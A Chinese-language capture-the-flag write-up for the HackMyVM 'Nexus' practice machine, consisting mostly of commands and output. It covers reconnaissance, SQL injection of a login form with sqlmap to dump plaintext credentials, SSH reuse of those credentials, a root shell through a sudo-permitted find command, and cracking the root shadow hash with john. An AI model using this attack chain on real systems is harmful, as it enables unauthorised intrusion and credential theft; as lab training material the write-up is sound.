
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Nexus
```

```shell
难度：⭐️
知识点：信息收集，`sql注入`，`sqlmap`使用，`find`提权，图片瘾写？
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.131  08:00:27:e9:d5:85       PCS Systemtechnik GmbH
└─# IP=192.168.31.131
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 20:14 CST
Nmap scan report for Loooower (192.168.31.131)
Host is up (0.0016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:E9:D5:85 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`22、80`端口

### 目录扫描

```shell
└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
[20:15:53] 200 -   13KB - /index2.php
[20:15:54] 200 -  241B  - /login.php

```

`index2.php`看源码，可以发现登陆页面地址`http://[personal ip]/auth-login.php`

```
#view-source:http://192.168.31.131/index2.php
<li>NEXUS MSG> _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php</li>
http://192.168.31.131/auth-login.php
```

随便用个用户名`admin/admin`登陆后显示` Acceso denegado.`，用户名处加个`'`闭合报错

![image-20250606203207230](https://gitee.com/shui666/images/raw/master/images/image-20250606203207230.png)

明显注入点，抓包丢给`sqlmap`一把嗦

##### ` sqlmap`

`sql注入`测试数据库信息

```shell
#bup->1.txt
POST /login.php HTTP/1.1
Host: 192.168.31.131
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.131/auth-login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=admin&pass=123

##sqlmap一把嗦###
sqlmap -l 1.txt --batch
sqlmap -l 1.txt --batch --dbs
sqlmap -l 1.txt --batch -D php --tables
sqlmap -l 1.txt --batch -D php -T usuarios --dump

#sqlmap -l 1.txt --batch --dbs
available databases [6]:
[*] information_schema
[*] mysql
[*] Nebuchadnezzar
[*] performance_schema
[*] sion
[*] sys
#sqlmap -l 1.txt --batch -D sion --tables
Database: sion
[1 table]
+-------+
| users |
+-------+
#sqlmap -l 1.txt --batch -D sion -T users --dump
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
```

获得两个用户信息`admin/cambiame08、shelly/F4ckTh3F4k3H4ck3r5`，测试两个账户都能登录，登陆后提示管理员，但是做不了啥

```shell
#http://192.168.31.131/login.php
Acceso concedido. Bienvenido, admin
"访问通过！管理员，欢迎登录。"
Acceso concedido. Bienvenido, shelly.
```

既然`web`没信息，试试用账号登陆`ssh`

### 获得`shelly`权限

 测试直接用`shelly/F4ckTh3F4k3H4ck3r5`成功`ssh`登陆靶机

```
└─# ssh shelly@$IP
The authenticity of host '192.168.31.131 (192.168.31.131)' can't be established.
ED25519 key fingerprint is SHA256:r1lUfXxL8Fd1e/Q87Jno3P3xHjMTUwmJlKfcsl0AST8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.31.131' (ED25519) to the list of known hosts.
**************************************************************
HackMyVM System                                              *
                                                             *
   *  .  . *       *    .        .        .   *    ..        *
 .    *        .   ###     .      .        .            *    *
    *.   *        #####   .     *      *        *    .       *
  ____       *  ######### *    .  *      .        .  *   .   *
 /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *
/___/  ^8/      ###\|/###  *    *            .      *   *    *
|   ||%%(        # }|{  #                                    *
|___|,  \\         }|{                                       *
                                                             *
                                                             *
Wellcome to Nexus Vault.                                     *
**************************************************************



shelly@192.168.31.131's password:


######################
DONT TOUCH MY SYSTEM #
######################
Last login: Thu May  8 22:44:41 2025 from 192.168.1.10
shelly@NexusLabCTF:~$
shelly@NexusLabCTF:~$
shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) grupos=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
shelly@NexusLabCTF:~$ cd
shelly@NexusLabCTF:~$ ls -artl
total 28
drwxr-xr-x 3 root   root   4096 mar 28 16:18 ..
-rw-r--r-- 1 shelly shelly  807 mar 28 16:18 .profile
-rw-r--r-- 1 shelly shelly  220 mar 28 16:18 .bash_logout
drwxr-xr-x 3 shelly shelly 4096 abr 21 22:00 .local
drwxr-xr-x 2 root   root   4096 may  8 17:07 SA
-rw-r--r-- 1 shelly shelly 3530 may  8 17:15 .bashrc
drwx------ 4 shelly shelly 4096 may  8 22:51 .
```

##### 拿到`user-flag.txt`

```
shelly@NexusLabCTF:~$ pwd
/home/shelly
shelly@NexusLabCTF:~$ cd SA
shelly@NexusLabCTF:~/SA$ ls -artl
total 12
-rw-r--r-- 1 root   root    804 may  8 17:07 user-flag.txt
drwxr-xr-x 2 root   root   4096 may  8 17:07 .
drwx------ 4 shelly shelly 4096 may  8 22:51 ..
shelly@NexusLabCTF:~/SA$ cat user-flag.txt

   ▄█    █▄      ▄▄▄▄███▄▄▄▄    ▄█    █▄
  ███    ███   ▄██▀▀▀███▀▀▀██▄ ███    ███
  ███    ███   ███   ███   ███ ███    ███
 ▄███▄▄▄▄███▄▄ ███   ███   ███ ███    ███
▀▀███▀▀▀▀███▀  ███   ███   ███ ███    ███
  ███    ███   ███   ███   ███ ███    ███
  ███    ███   ███   ███   ███ ███    ███
  ███    █▀     ▀█   ███   █▀   ▀██████▀

HackMyVM
Flag User ::  
```



### 获得root

`sudo`发现 所有用户能够以 `root `身份运行 `/usr/bin/find`

```shell
shelly@NexusLabCTF:/tmp$ sudo -l
Matching Defaults entries for shelly on NexusLabCTF:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=LD_PRELOAD, use_pty

User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

[[查阅](https://gtfobins.github.io/)](https://gtfobins.github.io/)` GTFObins`，直接 `find` 提权

```shell
#Sudo
sudo find . -exec /bin/sh \; -quit
```

发现图片`use-fim-to-root.png` 

```shell
shelly@NexusLabCTF:/tmp$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) grupos=0(root)
# cd
# ls -artl
total 32
-rw-r--r--  1 root root  161 jul  9  2019 .profile
-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
drwx------  2 root root 4096 mar 28 16:10 .ssh
drwxr-xr-x 18 root root 4096 mar 28 16:10 ..
drwxr-xr-x  3 root root 4096 abr 19 15:59 .local
-rw-------  1 root root    2 abr 19 18:10 .mysql_history
-rw-------  1 root root    0 may  8 16:24 .fim_history
drwxr-xr-x  2 root root 4096 may  8 16:43 Sion-Code
drwx------  5 root root 4096 may  8 22:52 .
# cd Sion-Code
# ls
use-fim-to-root.png
```

先把图片取下来

```shell
# cp use-fim-to-root.png /var/www/html
#http://192.168.31.131/use-fim-to-root.png
```

![use-fim-to-root](https://gitee.com/shui666/images/raw/master/images/use-fim-to-root.png)

`HMV-FLAG`就藏在图片结尾，用`xxd、cat、strings`等打开就能看到

```shell
└─#  wget http://$IP/use-fim-to-root.png
--2025-06-06 21:08:44--  http://192.168.31.131/use-fim-to-root.png
正在连接 192.168.31.131:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：72673 (71K) [image/png]
正在保存至: “use-fim-to-root.png”

use-fim-to-root.png           100%[=================================================>]  70.97K  --.-KB/s  用时 0.004s

2025-06-06 21:08:44 (16.3 MB/s) - 已保存 “use-fim-to-root.png” [72673/72673])

┌──(root㉿LAPTOP-FAMILY)-[/tmp]
└─# xxd use-fim-to-root.png
00011bb0: 2e06 4870 0232 2000 3b48 4d56 2d46 4c41  ..Hp.2 .;HMV-FLA
00011bc0: 475b 5b20 7033 7668 4b50 3964 3937 6137  G[[ p3vhKP9d97a7
00011bd0: 484d 5637 3961 6439 6b73 3273 3920 5d5d  HMV79ad9ks2s9 ]]
##直接放末尾没难度，靶机上直接看就行
# pwd
/root/Sion-Code
# ls
use-fim-to-root.png
# strings use-fim-to-root.png | tail -n 5
t a{q
qo+p
B0$/
Pt<H4
;HMV-FLAG[[  ]]
```

找到 `root flag` 为` HMV-FLAG[[  ]]`

##### 拿到`root.txt`

```shell
└─# strings use-fim-to-root.png | tail -n 2
Pt<H4
;HMV-FLAG[[  ]]
#root-flag

```

##### 后记

读取`shadow`后爆破`root`密码为`test`，还是个弱密码

```shell
└─# cat shadow.txt
root:$y$j9T$H0FjIhSe9FN2i0grftA1M1$Sjlj7ahMFjoyCDMATZUNknnI/7izWiYlRiWx82.6lG.:20175:0:99999:7:::

┌──(root㉿LAPTOP-FAMILY)-[/tmp]
└─# john shadow.txt --format=crypt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])

Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (root)
1g 0:00:00:00 DONE (2025-06-06 21:50) 2.631g/s 505.2p/s 505.2c/s 505.2C/s dallas..0000
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```